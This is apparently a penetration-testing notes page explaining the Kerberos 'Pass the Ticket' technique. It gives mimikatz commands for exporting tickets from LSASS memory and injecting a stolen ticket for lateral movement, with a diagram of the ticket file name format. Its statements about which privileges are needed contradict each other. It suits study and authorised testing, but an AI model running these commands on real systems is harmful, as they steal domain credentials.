---
title: Pass The Ticket
---

:::danger Required Privileges: `Administrators`

Extracting `Ticket Granting Services` will require us to have **Administrator's Credentials**.

Injecting Tickets in our own Session doesn't require Administrator Privileges.

:::


Sometimes it will be possible to extract **`Kerberos` Tickets** and **Session Keys** from **`LSASS`** Memory using **`mimikatz`**. The process usually requires us to have **SYSTEM** Privileges on the Target Machine.

<br/>

```batch
privilege::debug
sekurlsa::tickets /export
```

<br/>

While **`mimikatz`** can extract any **TGT** or **TGS** Available from the Memory of the **LSASS** Process, most of the time, we'll be interested in **TGTs** as they can be used to request access to any Services the user is allowed to access. At the same time, **TGSs** are only good for a specific service.

Extracting **TGTs** will require us to have **Administrator's Credentials**, and extracting TGSs can be done with a **Low-Privileged Account** **[Only the ones assigned to that Account]**

<br/>

```batch
:: Injecting the Ticket
kerberos::ptt [0;e06e9]-0-0-40a50000-delilah.gomez@LDAP-DC.DOMAIN.com.kirbi
```

<br/>

Injecting Tickets in our own Session doesn't require Administrator Privileges. After this, the tickets will be available for any Tools we use for Lateral Movement. 

```batch
:: Check if the Tickets were Injected Correctly
klist
```

<br/>

### Deeper Explanation

Once the **Tickets** are **Extracted** they are going to be Available in the same Folder as **`mimikatz`.**

```batch
:: Ticket        
[0;97d82]-2-0-40e10000-t2_felicia.dean@krbtgt-DOMAIN.COM.kirbi
```


```log
[0;97d82]-2-0-40e10000-t2_felicia.dean@krbtgt-DOMAIN.COM.kirbi
└───────┘ ^ └────────┘ └─────────────┘ └───────────────┘└────┘
    |     |     |             |                |           └─────► 6. File Extension
    |     |     |             |                |
    |     |     |             |                └─────► 5. Resource
    |     |     |             |
    |     |     |             └─────► 4. User - Computer Account [Ticket Owner]
    |     |     |
    |     |     └─────► 3. 0x40e10000 Kerberos Flag
    |     |
    |     └─────► 2. Kerberos Ticket Type
    |             0 = TGS / 1 = Client Ticket / 2 = TGT
    |
    └─────► 1. 0x97d82 User LUID
```